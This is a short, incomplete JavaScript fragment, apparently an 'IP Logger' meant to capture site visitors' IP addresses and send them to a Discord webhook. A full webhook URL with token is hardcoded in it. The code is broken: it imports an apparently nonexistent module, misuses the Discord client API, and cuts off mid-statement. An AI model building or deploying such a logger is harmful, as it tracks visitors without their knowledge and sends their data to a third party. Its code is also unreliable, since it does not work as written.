// Get visitor IP and send to Discord Webhook
const express = require('express');const app = express();const webhooks = require('express-webhook');const Discord = require('discord.js');const { Client} = Discord;

// Initialize Discord client
const client = new Client();const webhookURL = 'https://discord.com/api/webhooks/1373867976188756008/YsV-h95KrYtgAjJi2bZst4qzbcaTTZ57JZYESO3uPFVd-sivSXBJSYSJX1xyFhMzqtMg';

// Set up webhook listener
client.on('ready', () => {
  console.log('Discord bot ready');  client.webhooks.create({
    name: 'IP Logger',
    avatar: 'https://example.com/ip_logger_avatar.png',}, webhookURL);});// Set up Express.js server
app.
